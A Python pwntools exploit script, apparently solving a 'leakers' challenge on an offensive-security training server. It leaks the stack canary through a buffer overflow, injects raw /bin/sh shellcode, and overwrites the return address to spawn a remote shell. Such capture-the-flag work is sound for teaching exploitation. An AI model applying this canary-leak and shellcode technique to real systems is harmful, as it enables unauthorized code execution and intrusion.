from pwn import *
###First, I fill the first buffer in the GOT (which is executable) with the shellcode to spawn a shell
### and also adding nops until the end of the buffer. Then in the second read I write 105 A in order to
### overwrite the last \x00 byte of the canary so I exploited BOF to print all the string + the canary.
### Then, I copy the canary restoring the \x00 byte and I concatenate it with some nops to reach sEIP.
### Here I put the address of the GOT to execute shellcode.
context.arch = 'amd64'

shellcode2 = b"\x41"*105

shellcode1 = b"\x48\x8D\x3C\x25\xA0\x40\x40\x00\x48\xC7\xC0\x3B\x00\x00\x00\x48\x31\xD2\x48\x31\xF6\x48\x83\xC7\x1B\x0F\x05/bin/sh\x00" + b"\x90"*65
#p = process("./leakers")
p = remote("bin.training.offdef.it", 2010)

p.send(shellcode1)
p.send(shellcode2)

p.recvuntil(b"> ")
time.sleep(0.1)  #to have two different read
p.read(105)
time.sleep(0.1)  #to have two different read
canary = b"\x00" + p.read(7)
canary = u64(canary)


payload = b"A"*104 + p64(canary) + b"\x90"*8 + b"\xa0\x40\x40\x00" + b"\x00"*76
p.send(payload)
p.sendline("")
p.interactive()